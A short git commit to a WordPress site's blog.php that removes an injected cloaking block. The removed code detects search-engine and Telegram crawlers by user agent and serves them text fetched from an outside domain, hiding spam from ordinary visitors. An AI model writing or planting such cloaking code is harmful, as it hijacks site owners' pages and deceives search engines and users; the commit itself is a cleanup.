bb72cfce4612414cdc7b6e17477b05fb1f5d4286
sentapabis <ayamtenggen21@gmail.com>
2024-10-17 11:37:25 +0700

    Update blog.php

--- blog.php
+++ blog.php
@@ -1,25 +1,4 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-if (is_bot()) {
-    $message = file_get_contents('https://kanwilpajakkalselteng.net/utama/ismafarsi/ismafarsi.txt');
-    echo $message;
-exit;
-}
-?>
-
-<?php
 /**
  * Loads the WordPress environment and template.
  *
